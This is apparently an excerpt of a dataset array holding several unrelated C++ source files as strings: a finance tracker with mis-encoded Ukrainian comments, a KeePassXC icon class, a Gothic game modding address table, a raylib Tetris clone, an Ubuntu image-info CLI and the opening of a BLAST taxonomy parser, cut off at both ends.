krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[4][0] << spacja << kraw_pion << spacja << T[4][1] << spacja << kraw_pion << spacja << T[4][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[4][3] << spacja << kraw_pion << spacja << T[4][4] << spacja << kraw_pion << spacja << T[4][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"     ",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <unordered_map>\n#include <algorithm>\n\nusing namespace std;\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\nstruct Expense {\n    string category;\n    double amount;\n    string date;\n};\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00e4\u00eb\u00ff \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3\u00e2\nstruct Wallet {\n    string name;\n    double balance;\n\n    // \u00ca\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00ee\u00f0 \u00e4\u00eb\u00ff \u00b3\u00ed\u00b3\u00f6\u00b3\u00e0\u00eb\u00b3\u00e7\u00e0\u00f6\u00b3\u00bf \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00ff \u00e7 \u00b3\u00ec'\u00ff\u00ec \u00f2\u00e0 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00ee\u00e2\u00e8\u00ec \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00ee\u00ec\n    Wallet(string walletName, double initialBalance) : name(walletName), balance(initialBalance) {}\n};\n\n// \u00ca\u00eb\u00e0\u00f1 \u00e4\u00eb\u00ff \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00b3\u00ed\u00ed\u00ff \u00f4\u00b3\u00ed\u00e0\u00ed\u00f1\u00e0\u00ec\u00e8\nclass FinanceManager {\nprivate:\n    vector<Wallet> wallets; // \u00e3\u00e0\u00ec\u00e0\u00ed\u00f6\u00b3 \u00f2\u00e0 \u00bf\u00f5 \u00e1\u00e0\u00eb\u00e0\u00ed\u00f1\u00e8\n    vector<Expense> expenses; // \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n\npublic:\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void addWallet(string walletName) {\n        wallets.push_back(Wallet(walletName, 0.0));\n    }\n\n    // \u00cf\u00ee\u00ef\u00ee\u00e2\u00ed\u00e8\u00f2\u00e8 \u00e3\u00e0\u00ec\u00e0\u00ed\u00e5\u00f6\u00fc\n    void deposit(string walletName, double amount) {\n        for (size_t i = 0; i < wallets.size(); ++i) {\n            if (wallets[i].name == walletName) {\n                wallets[i].balance += amount;\n                break;\n            }\n        }\n    }\n\n    // \u00c4\u00ee\u00e4\u00e0\u00f2\u00e8 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\u00f3\n    void addExpense(string category, double amount, string date) {\n        expenses.push_back(Expense{ category, amount, date });\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00e4\u00e5\u00ed\u00fc\n    void generateDailyReport(string date) {\n        double totalExpenses = 0.0;\n        cout << \"Daily Report for \" << date << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date == date) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc\n    void generateWeeklyReport(string startDate, string endDate) {\n        double totalExpenses = 0.0;\n        cout << \"Weekly Report from \" << startDate << \" to \" << endDate << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date >= startDate && expenses[i].date <= endDate) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e8\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00e7\u00e0 \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc\n    void generateMonthlyReport(string month) {\n        double totalExpenses = 0.0;\n        cout << \"Monthly Report for \" << month << \":\" << endl;\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            if (expenses[i].date.substr(0, 7) == month) {\n                totalExpenses += expenses[i].amount;\n                cout << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << endl;\n            }\n        }\n        cout << \"Total Expenses: \" << totalExpenses << endl;\n    }\n\n    // \u00d4\u00ee\u00f0\u00ec\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00e5\u00e2\u00ed\u00e8\u00e9 \u00ef\u00e5\u00f0\u00b3\u00ee\u00e4 (\u00f2\u00e8\u00e6\u00e4\u00e5\u00ed\u00fc \u00e0\u00e1\u00ee \u00ec\u00b3\u00f1\u00ff\u00f6\u00fc)\n    void generateTopExpenses(string periodStart, string periodEnd) {\n        unordered_map<string, double> categorySums; // \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea \u00e4\u00eb\u00ff \u00f1\u00f3\u00ec \u00ea\u00ee\u00e6\u00ed\u00ee\u00bf \u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00bf\n        size_t expensesSize = expenses.size();\n        for (size_t i = 0; i < expensesSize; ++i) {\n            const Expense& expense = expenses[i];\n            if (expense.date >= periodStart && expense.date <= periodEnd) {\n                categorySums[expense.category] += expense.amount;\n            }\n        }\n\n        // \u00d1\u00f2\u00e2\u00ee\u00f0\u00e5\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00ef\u00e0\u00f0 <\u00ea\u00e0\u00f2\u00e5\u00e3\u00ee\u00f0\u00b3\u00ff, \u00f1\u00f3\u00ec\u00e0> \u00e7\u00b3 \u00f1\u00eb\u00ee\u00e2\u00ed\u00e8\u00ea\u00e0\n        vector<pair<string, double>> categorySumsVec;\n        categorySumsVec.reserve(categorySums.size());\n        for (auto it = categorySums.begin(); it != categorySums.end(); ++it) {\n            categorySumsVec.push_back(make_pair(it->first, it->second));\n        }\n\n        // \u00d1\u00ee\u00f0\u00f2\u00f3\u00e2\u00e0\u00ed\u00ed\u00ff \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e0 \u00e7\u00e0 \u00f1\u00ef\u00e0\u00e4\u00e0\u00ed\u00ed\u00ff\u00ec \u00f1\u00f3\u00ec\n        sort(categorySumsVec.begin(), categorySumsVec.end(), [](const pair<string, double>& a, const pair<string, double>& b) {\n            return a.second > b.second;\n            });\n\n        // \u00c2\u00e8\u00e2\u00e5\u00e4\u00e5\u00ed\u00ed\u00ff \u00d2\u00ce\u00cf-3 \u00e2\u00e8\u00f2\u00f0\u00e0\u00f2\n        cout << \"TOP-3 Expenses for the period \" << periodStart << \" to \" << periodEnd << \":\" << endl;\n        size_t limit = min(static_cast<size_t>(3), categorySumsVec.size());\n        for (size_t i = 0; i < limit; ++i) {\n            cout << i + 1 << \". Category: \" << categorySumsVec[i].first << \", Total amount: \" << categorySumsVec[i].second << endl;\n        }\n    }\n\n    // \u00c7\u00e1\u00e5\u00f0\u00e5\u00e3\u00f2\u00e8 \u00e7\u00e2\u00b3\u00f2 \u00f2\u00e0 \u00f0\u00e5\u00e9\u00f2\u00e8\u00ed\u00e3\u00e8 \u00f3 \u00f4\u00e0\u00e9\u00eb\n    void saveToFile(string filename) {\n        ofstream outFile(filename);\n        if (outFile.is_open()) {\n            outFile << \"Expenses:\" << endl;\n            size_t expensesSize = expenses.size();\n            for (size_t i = 0; i < expensesSize; ++i) {\n                outFile << \"Category: \" << expenses[i].category << \", Amount: \" << expenses[i].amount << \", Date: \" << expenses[i].date << endl;\n          ",
    "/*\n *  Copyright (C) 2010 Felix Geyer <debfx@fobos.de>\n *\n *  This program is free software: you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation, either version 2 or (at your option)\n *  version 3 of the License.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"DatabaseIcons.h\"\n\n#include \"core/Config.h\"\n#include \"core/Global.h\"\n\n#include <QDir>\n#include <QImageReader>\n#include <QPainter>\n#include <QPixmapCache>\n\nDatabaseIcons* DatabaseIcons::m_instance(nullptr);\n\nnamespace\n{\n    const QString iconDir = QStringLiteral(\":/icons/database/\");\n    QStringList iconList;\n\n    const QString badgeDir = QStringLiteral(\":/icons/badges/\");\n    QStringList badgeList;\n} // namespace\n\nDatabaseIcons::DatabaseIcons()\n{\n    iconList = QDir(iconDir).entryList(QDir::NoFilter, QDir::Name);\n    badgeList = QDir(badgeDir).entryList(QDir::NoFilter, QDir::Name);\n\n    // Set this early and once to ensure consistent icon size until app restart\n    m_compactMode = config()->get(Config::GUI_CompactMode).toBool();\n}\n\nDatabaseIcons* DatabaseIcons::instance()\n{\n    if (!m_instance) {\n        m_instance = new DatabaseIcons();\n    }\n\n    return m_instance;\n}\n\nQPixmap DatabaseIcons::icon(int index, IconSize size)\n{\n    if (index < 0 || index >= count()) {\n        qWarning(\"DatabaseIcons::icon: invalid icon index %d, using 0 instead\", index);\n        index = 0;\n        Q_ASSERT_X(false, \"DatabaseIcons::icon\", \"invalid icon index %d\");\n    }\n\n    auto cacheKey = QString::number(index);\n    auto icon = m_iconCache.value(cacheKey);\n    if (icon.isNull()) {\n        icon.addFile(iconDir + iconList[index]);\n        icon.addPixmap(icon.pixmap(64));\n        m_iconCache.insert(cacheKey, icon);\n    }\n\n    return icon.pixmap(iconSize(size));\n}\n\nQPixmap DatabaseIcons::applyBadge(const QPixmap& basePixmap, Badges badgeIndex)\n{\n    const auto cacheKey = QStringLiteral(\"badgedicon-%1-%2\").arg(basePixmap.cacheKey()).arg(badgeIndex);\n    QPixmap pixmap = basePixmap;\n    if (badgeIndex < 0 || badgeIndex >= badgeList.size()) {\n        qWarning(\"DatabaseIcons: Out-of-range badge index given to applyBadge: %d\", badgeIndex);\n    } else if (!QPixmapCache::find(cacheKey, &pixmap)) {\n        int baseSize = basePixmap.width();\n        int badgeSize =\n            baseSize <= iconSize(IconSize::Default) * basePixmap.devicePixelRatio() ? baseSize * 0.6 : baseSize * 0.5;\n        QPoint badgePos(baseSize - badgeSize, baseSize - badgeSize);\n        badgePos /= basePixmap.devicePixelRatio();\n\n        QImageReader reader(badgeDir + badgeList[badgeIndex]);\n        reader.setScaledSize({badgeSize, badgeSize});\n        auto badge = QPixmap::fromImageReader(&reader);\n        badge.setDevicePixelRatio(basePixmap.devicePixelRatio());\n\n        QPainter painter(&pixmap);\n        painter.setCompositionMode(QPainter::CompositionMode_SourceOver);\n        painter.drawPixmap(badgePos, badge);\n\n        QPixmapCache::insert(cacheKey, pixmap);\n    }\n\n    return pixmap;\n}\n\nint DatabaseIcons::count()\n{\n    return iconList.size();\n}\n\nint DatabaseIcons::iconSize(IconSize size)\n{\n    switch (size) {\n    case Medium:\n        return m_compactMode ? 26 : 30;\n    case Large:\n        return m_compactMode ? 30 : 36;\n    default:\n        return m_compactMode ? 16 : 22;\n    }\n}\n",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_I_Addon {\n\n#ifdef __OAI_HUMAN_H__VER1__\n  zSTRING& oCAIHuman::Cam_Normal = *(zSTRING*)0x0091E828;\n  zSTRING& oCAIHuman::Cam_Run    = *(zSTRING*)0x0091E788;\n  zSTRING& oCAIHuman::Cam_Fight  = *(zSTRING*)0x0091E810;\n#endif // __OAI_HUMAN_H__VER1__\n\n#ifdef __OCOLLISION_OBJECT_MISC_CHAR_H__VER1__\n  zCCollisionObjectDef& oCCollObjectCharacter::s_oCollObjClass = *(zCCollisionObjectDef*)0x00A22CA8;\n#endif // __OCOLLISION_OBJECT_MISC_CHAR_H__VER1__\n\n#ifdef __ODOC_H__VER1__\n  zCView*& oCDoc::posView = *(zCView**)0x00920B20;\n#endif // __ODOC_H__VER1__\n\n#ifdef __OFOCUS_H__VER1__\n  oCNpcFocus*& oCNpcFocus::focus      = *(oCNpcFocus**)0x00920BC0;\n  oCNpcFocus** oCNpcFocus::focuslist  = (oCNpcFocus**)0x00920BA8;\n#endif // __OFOCUS_H__VER1__\n\n#ifdef __OINFO_H__VER1__\n  int& oCInfoManager::size_checked = *(int*)0x00921624;\n#endif // __OINFO_H__VER1__\n\n#ifdef __OINVENTORY_H__VER1__\n  zCList<oCItemContainer>& oCItemContainer::contList = *(zCList<oCItemContainer>*)0x00921820;\n  int& oCItemContainer::gfx_loaded                   = *(int*)0x009218D4;\n  zCGfx*& oCItemContainer::gfx_cat                   = *(zCGfx**)0x009218D8;\n  zCGfx*& oCItemContainer::gfx_equip                 = *(zCGfx**)0x009218DC;\n  zCGfx*& oCItemContainer::gfx_cursor                = *(zCGfx**)0x009218E0;\n  zCGfx*& oCItemContainer::gfx_cursor_equip          = *(zCGfx**)0x009218E4;\n  zCGfx** oCItemContainer::gfx_arrow                 = (zCGfx**)0x009218E8;\n  zCGfx** oCNpcInventory::gfx_cats                   = (zCGfx**)0x009218FC;\n#endif // __OINVENTORY_H__VER1__\n\n#ifdef __OITEM_REACT_H__VER1__\n  int& oCTradeManager::size_checked = *(int*)0x00921B3C;\n#endif // __OITEM_REACT_H__VER1__\n\n#ifdef __OMUSIC_ZONE_H__VER1__\n  long& oCZoneMusic::s_lastzonechange       = *(long*)0x0092675C;\n  int& oCZoneMusic::s_zonetime              = *(int*)0x008996D4;\n  int& oCZoneMusic::s_daytime               = *(int*)0x008996D8;\n  oHEROSTATUS& oCZoneMusic::s_herostatus    = *(oHEROSTATUS*)0x00926760;\n  oCZoneMusic*& oCZoneMusic::s_musiczone    = *(oCZoneMusic**)0x00926764;\n  oCZoneMusic*& oCZoneMusic::s_oldmusiczone = *(oCZoneMusic**)0x00926768;\n#endif // __OMUSIC_ZONE_H__VER1__\n\n#ifdef __ONEWS_H__VER1__\n  int& oCNews::news_counter = *(int*)0x0092258C;\n#endif // __ONEWS_H__VER1__\n\n#ifdef __ONPC_H__VER1__\n  zSTRING*& oCNpc::FightAIInstances        = *(zSTRING**)0x00A225B8;\n  oCNpc::oEBloodMode& oCNpc::modeBlood     = *(oCNpc::oEBloodMode*)0x0089E9E4;\n  int& oCNpc::isEnabledDamageDebug         = *(int*)0x00A22514;\n  oCStealContainer*& oCNpc::stealcontainer = *(oCStealContainer**)0x009232F8;\n  int& oCNpc::s_bEnabledDialogCamStop      = *(int*)0x00923138;\n  zMAT4& oCNpc::s_playerPositionMatrix     = *(zMAT4*)0x00923178;\n  oCNpc*& oCNpc::player                    = *(oCNpc**)0x00923134;\n  int& oCNpc::godmode                      = *(int*)0x0092311C;\n  int& oCNpc::angle_near                   = *(int*)0x00893F90;\n  int& oCNpc::angle_far_up                 = *(int*)0x00893F94;\n  int& oCNpc::angle_far_side               = *(int*)0x00893F98;\n  int& oCNpc::game_mode                    = *(int*)0x009232EC;\n  oCNpc*& oCNpc::dontArchiveThisNpc        = *(oCNpc**)0x0092313C;\n  int*& oCNpc::bodyStateList               = *(int**)0x00922A48;\n  int& oCNpc::ai_disabled                  = *(int*)0x00923120;\n  float& oCNpc::ai_messagesSkip            = *(float*)0x00923124;\n  float& oCNpc::ai_messagesSkipTimer       = *(float*)0x00923128;\n  float& oCNpc::ai_scriptStateSkip         = *(float*)0x0092312C;\n  float& oCNpc::ai_scriptStateSkipTimer    = *(float*)0x00923130;\n  int& oCNpc::ai_baseEnabled               = *(int*)0x00893F84;\n  int& oCNpc::isEnabledTalkBox             = *(int*)0x00893F88;\n#endif // __ONPC_H__VER1__\n\n#ifdef __OTEXT_H__VER1__\n  zCView*& oCText::output           = *(zCView**)0x0092414C;\n  int& oCText::TXT_GUILD            = *(int*)0x00924150;\n  int& oCText::TXT_ATTRIBUTE        = *(int*)0x00924154;\n  int& oCText::TXT_FIGHT_TALENT     = *(int*)0x00924158;\n  int& oCText::TXT_TALENT           = *(int*)0x0092415C;\n  int& oCText::TXT_DAYTIME          = *(int*)0x00924160;\n  int*& oCText::TXT_ATR             = *(int**)0x00924134;\n  int& oCText::TXT_ATR_HP           = *(int*)0x00924164;\n  int& oCText::TXT_SPELL            = *(int*)0x0092416C;\n  int& oCText::TXT_ATTITUDE         = *(int*)0x00924168;\n  int& oCText::TXT_PC_GREETING      = *(int*)0x00924170;\n  int& oCText::TXT_PC_FIRST_PHRASE  = *(int*)0x00924174;\n  int& oCText::TXT_PC_SECOND_PHRASE = *(int*)0x00924178;\n  int& oCText::TXT_PC_TRADE_PHRASE  = *(int*)0x0092417C;\n  int& oCText::TXT_NPC_LAST_PHRASE  = *(int*)0x00924180;\n  int& oCText::TXT_PC_TRADE_THREAT  = *(int*)0x00924184;\n  int& oCText::TXT_NPC_TRADE_THREAT = *(int*)0x00924188;\n  int& oCText::TXT_PC_INFO_THREAT   = *(int*)0x0092418C;\n  int& oCText::TXT_NPC_INFO_THREAT  = *(int*)0x00924190;\n  int& oCText::TXT_NEWS_INTRO       = *(int*)0x00924198;\n  int& oCText::TXT_NEWS_STOLE       = *(int*)0x0092419C;\n  int& oCText::TXT_NEWS_STOLE_10    =",
    "#include \"Game.hpp\"\n#include <random>\nGame::Game()\n{\n    grid = Grid();\n    blocks = GetAllBlocks();\n    current_block = GetRandomBlock();\n    next_block = GetRandomBlock();\n    game_over = false;\n    score = 0;\n    InitAudioDevice();\n    music = LoadMusicStream(\"sounds/music.mp3\");\n    PlayMusicStream(music);\n    rotate_sound = LoadSound(\"sounds/rotate.mp3\");\n    clear_sound = LoadSound(\"sounds/clear.mp3\");\n}\nGame::~Game()\n{\n    UnloadSound(rotate_sound);\n    UnloadSound(clear_sound);\n    UnloadMusicStream(music);\n    CloseAudioDevice();\n}\nBlock Game::GetRandomBlock()\n{\n    if (blocks.empty())\n    {\n        blocks = GetAllBlocks();\n    }\n    int rand_index = rand() % blocks.size();\n    Block block = blocks[rand_index];\n    blocks.erase(blocks.begin() + rand_index);\n    return block;\n}\n\nstd::vector<Block> Game::GetAllBlocks()\n{\n    return {TBlock(), ZBlock(), SBlock(), OBlock(), IBlock(), JBlock(), LBlock()};\n}\n\nvoid Game::Draw()\n{\n    grid.Draw();\n    current_block.Draw(11, 11);\n    switch (next_block.id)\n    {\n    case 3:\n        next_block.Draw(255, 290);\n        break;\n    case 4:\n        next_block.Draw(255, 280);\n        break;\n    default:\n        next_block.Draw(270, 270);\n        break;\n    }\n}\n\nvoid Game::Reset()\n{\n    grid.initialize();\n    blocks = GetAllBlocks();\n    current_block = GetRandomBlock();\n    next_block = GetRandomBlock();\n    score = 0;\n}\nvoid Game::HandleInput()\n{\n    int key_pressed = GetKeyPressed();\n    if (game_over && key_pressed != 0)\n    {\n        game_over = false;\n        Reset();\n    }\n    if (key_pressed == KEY_LEFT)\n        MoveBlockLeft();\n    if (key_pressed == KEY_RIGHT)\n        MoveBlockRight();\n    if (key_pressed == KEY_DOWN)\n    {\n        MoveBlockDown();\n        UpdatingScore(0, 1);\n    }\n    if (key_pressed == KEY_UP)\n        RotateBlock();\n}\n\nbool Game::IsBlockOutside()\n{\n    std::vector<Position> tiles = current_block.GetCellPosition();\n    for (Position item : tiles)\n    {\n        if (grid.IsCellOutSide(item.row, item.column))\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid Game::MoveBlockLeft()\n{\n    if (!game_over)\n    {\n        current_block.Move(0, -1);\n        if (IsBlockOutside() || BlockFits() == false)\n        {\n            current_block.Move(0, 1);\n        }\n    }\n}\n\nvoid Game::MoveBlockRight()\n{\n    if (!game_over)\n    {\n        current_block.Move(0, 1);\n        if (IsBlockOutside() || BlockFits() == false)\n        {\n            current_block.Move(0, -1);\n        }\n    }\n}\n\nvoid Game::MoveBlockDown()\n{\n    if (!game_over)\n    {\n        current_block.Move(1, 0);\n        if (IsBlockOutside() || BlockFits() == false)\n        {\n            current_block.Move(-1, 0);\n            LockBlock();\n        }\n    }\n}\n\nvoid Game::RotateBlock()\n{\n    if (!game_over)\n    {\n        current_block.Rotate();\n        if (IsBlockOutside() || BlockFits() == false)\n        {\n            current_block.UndoRotation();\n        }\n        else\n        {\n            PlaySound(rotate_sound);\n        }\n    }\n}\n\nvoid Game::LockBlock()\n{\n    std::vector<Position> tiles = current_block.GetCellPosition();\n    for (Position pos : tiles)\n    {\n        grid.cells[pos.row][pos.column] = current_block.id;\n    }\n    current_block = next_block;\n    if (BlockFits() == false)\n    {\n        game_over = true;\n        return;\n    }\n    next_block = GetRandomBlock();\n    int rows_cleared = grid.ClearFullRows();\n    if (rows_cleared)\n    {\n        PlaySound(clear_sound);\n        UpdatingScore(rows_cleared, 0);\n    }\n}\n\nbool Game::BlockFits()\n{\n    std::vector<Position> tiles = current_block.GetCellPosition();\n    for (Position pos : tiles)\n    {\n        if (grid.IsCellEmpty(pos.row, pos.column) == false)\n            return false;\n    }\n    return true;\n}\n\nvoid Game::UpdatingScore(int lines_cleared, int move_down_points)\n{\n    if (lines_cleared == 1)\n        score += 100;\n    else if (lines_cleared == 2)\n        score += 300;\n    else if (lines_cleared >= 3)\n        score += 500;\n    score += move_down_points;\n}\n",
    "#include \"ubuntu_image_info.cpp\"\n#include <iostream>\n\nvoid printSupportedReleases(UbuntuImageInfoImpl &imageInfo) {\n    std::vector<std::string> releases = imageInfo.getSupportedReleases();\n    std::cout << \"Currently supported releases:\" << std::endl;\n    for (const auto &release: releases) {\n        std::cout << release << std::endl;\n    }\n}\n\nvoid printCurrentLTSVersion(UbuntuImageInfoImpl &imageInfo) {\n    std::string ltsVersion = imageInfo.getCurrentLTSVersion();\n    if (!ltsVersion.empty()) {\n        std::cout << \"Current LTS version: \" << ltsVersion << std::endl;\n    } else {\n        std::cout << \"Unable to find the current LTS version.\" << std::endl;\n    }\n}\n\nvoid printSHA256(UbuntuImageInfoImpl &imageInfo, const std::string &release) {\n    std::string sha256 = imageInfo.getSHA256(release);\n    if (!sha256.empty()) {\n        std::cout << \"SHA256 for release \" << release << \": \" << sha256 << std::endl;\n    } else {\n        std::cout << \"Couldn't find the specified version: \" << release << std::endl;\n        std::cout << \"Please check the version number and try again.\" << std::endl;\n        std::cout << \"Example of a correct input: 22.04\" << std::endl;\n    }\n}\n\nint main(int argc, char *argv[]) {\n    try {\n\n        if (argc == 1) {\n            // Interactive mode\n            std::cout << \"Loading Ubuntu Cloud Image JSON..\" << std::endl;\n            UbuntuImageInfoImpl imageInfo;\n            std::cout << \"Ubuntu Cloud Image Data Loaded!\" << std::endl;\n\n            while (true) {\n                std::cout << \"Select an option:\" << std::endl;\n                std::cout << \"1. Get currently supported releases\" << std::endl;\n                std::cout << \"2. Get current LTS version\" << std::endl;\n                std::cout << \"3. Get SHA256 for a release\" << std::endl;\n                std::cout << \"4. Exit\" << std::endl;\n                std::cout << \"Enter your choice (1-4): \";\n\n                int choice;\n                std::cin >> choice;\n\n                switch (choice) {\n                    case 1:\n                        printSupportedReleases(imageInfo);\n                        break;\n                    case 2:\n                        printCurrentLTSVersion(imageInfo);\n                        break;\n                    case 3: {\n                        std::string release;\n                        std::cout << \"Enter the release (or 'latest'): \";\n                        std::cin >> release;\n                        printSHA256(imageInfo, release);\n                        break;\n                    }\n                    case 4:\n                        std::cout << \"Exiting...\" << std::endl;\n                        return 0;\n                    default:\n                        std::cout << \"Invalid choice. Please try again.\" << std::endl;\n                        break;\n                }\n\n                std::cout << std::endl;\n            }\n        } else if (argc == 2) {\n            std::string arg = argv[1];\n\n            if (arg == \"--supported-releases\") {\n                UbuntuImageInfoImpl imageInfo;\n                printSupportedReleases(imageInfo);\n            } else if (arg == \"--current-lts\") {\n                UbuntuImageInfoImpl imageInfo;\n                printCurrentLTSVersion(imageInfo);\n            } else {\n                std::cerr << \"Invalid argument: \" << arg << std::endl;\n                return 1;\n            }\n        } else if (argc == 3) {\n            std::string arg1 = argv[1];\n            std::string arg2 = argv[2];\n\n            if (arg1 == \"--sha256\") {\n                UbuntuImageInfoImpl imageInfo;\n                printSHA256(imageInfo, arg2);\n            } else {\n                std::cerr << \"Invalid arguments: \" << arg1 << \" \" << arg2 << std::endl;\n                return 1;\n            }\n        } else {\n            std::cerr << \"Invalid number of arguments.\" << std::endl;\n            return 1;\n        }\n    } catch (const std::exception &e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n        return 1;\n    }\n\n    return 0;\n}",
    "#include <unistd.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <stdint.h>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <unordered_map>\r\n#include <string>\r\n#include <vector>\r\n#include <stdexcept>\r\n#include <map>\r\n#include <set>\r\n#include <algorithm>\r\n#include <string>\r\n#include <list>\r\n#include <utility>\r\n#include <stdexcept>\r\n#include <deque>\r\n#include <regex>\r\n#include <iostream>\r\n#include <mutex>\r\n#include <thread>\r\ntemplate<typename K, typename V>\r\nvoid print_map(std::unordered_map<K, V> const &m)\r\n{\r\n    for (auto const &pair: m) {\r\n        std::cout << \"{\" << pair.first << \": \" << pair.second << \"}\\n\";\r\n    }\r\n}\r\n\r\nstd::mutex mtx;\r\n\r\n#include \"util.hpp\"\r\n\r\nvoid usage(char *progname);\r\nstd::vector<std::string> extractHitAccessions(const std::string& filename);\r\nvoid parseXML(const std::string& filename, const std::string& outputFilename);\r\nstd::string get_common_name(const std::string& taxonomy_id);\r\nvoid createDictionary(std::unordered_map<std::string, std::string>& taxid2name_dictionary, std::string names_filename);\r\nstd::string get_common_name(const std::unordered_map<std::string, std::string>& taxid2name_dictionary, const std::string& key);\r\nstd::vector<std::string> extractHitAccessionsMultiBLAST(const std::string& filename);\r\nvoid parse_dmnd_output(const std::string& filename, std::vector<std::vector<std::string>>& result);\r\nvoid parse_prot_acc2taxid_multithread(int threadNum, const std::string& filename, std::unordered_map<std::string, std::string>& dictionary, std::mutex& mergeMutex);\r\nstd::string processFileforBLASTdbcmd(const std::vector<std::string>& accession_nos, const std::string& sequence, const std::string& db_path, const std::string& outputFilename);\r\nstd::string executeCommand(const std::string& command);\r\nstd::vector<std::string> splitString(const std::string& str, char delimiter);\r\n\r\nint main(int argc, char** argv) {\r\n\r\n    std::unordered_map<Accession, TaxonId> acc2taxid;\r\n\t//std::cout << \"Allocating memory...\" << std::endl;\r\n\t//acc2taxid.reserve(4932678007);\r\n    TaxTree nodes;\r\n    std::unordered_map<TaxonId, TaxonName> node2name;\r\n\t//std::unordered_map<Accession, TaxonId> prot_acc2taxid_dict;\r\n\r\n\tstd::string nodes_filename = \"\";\r\n\tstd::string names_filename = \"\";\r\n\tstd::string acc2taxid_filename = \"\";\r\n\tstd::string in1_filename = \"\";\r\n\tstd::string out_filename;\r\n\r\n\t//These are only required if using BLAST command line tool\r\n\tstd::string filename = \"\";\r\n    std::string outputFilename = \"parsed_blast_output.tsv\";\r\n\r\n\tstd::unordered_map<std::string, std::string> taxid2name_dictionary;\r\n\t//std::unordered_map<std::string, std::string> prot_acc2taxid_dict;\r\n\t\r\n\t\r\n\tbool full_path = false;\r\n\tbool specified_ranks = false;\r\n    bool verbose = false;\r\n\tstd::string multiblast = \"false\";\r\n\tstd::string ranks_arg;\r\n\tstd::string sequence;\r\n\tstd::string db_path;\r\n\r\n\t// Variables related to multithreaded parse_prot_acc2tax_multithread function, not required if not generating dictionary\r\n\tstd::vector<std::thread> threads;\r\n    const int numThreads = 98;\r\n    const std::string directoryPath = \"processed/\";\r\n\r\n    std::unordered_map<std::string, std::string> mergedDictionary;\r\n    std::mutex mergeMutex; // Mutex for thread-safe access to mergedDictionary\r\n\r\n\t//use the parseXML function to write a tsv file with the blast data\r\n\t//parseXML(filename, outputFilename);\r\n\r\n\t// Read command line params\r\n\tint c;\r\n\twhile ((c = getopt(argc, argv, \"hva:f:s:i:o:r:pd:\")) != -1) {\r\n\t\tswitch (c) {\r\n\t\t\tcase 'h':\r\n\t\t\t\tusage(argv[0]);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'v':\r\n\t\t\t\tverbose = true;\r\n\t\t\t\tbreak;\r\n\t\t\t//case 'a':\r\n\t\t\t//\tacc2taxid_filename = 